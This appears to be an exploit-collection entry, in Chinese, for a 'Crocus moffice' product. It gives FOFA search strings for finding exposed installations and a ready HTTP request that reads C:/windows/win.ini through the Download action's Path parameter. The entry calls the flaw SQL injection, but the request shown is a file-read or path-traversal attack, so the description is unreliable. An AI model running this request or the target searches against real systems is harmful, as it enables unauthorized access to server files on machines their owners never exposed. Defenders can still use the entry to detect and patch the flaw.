**漏洞描述**

Crocus科技软件-moffice-sql注入漏洞

**fofa搜索语句**

body="inp_verification"或icon_hash="1819219374"

**影响版本**

Crocus 

**漏洞复现**

POC：

```yaml
GET /Service.do?Action=Download&Path=C:/windows/win.ini HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=07F19D6F7EDC273FDD7B2DBF5F9EB561
Connection: close


```

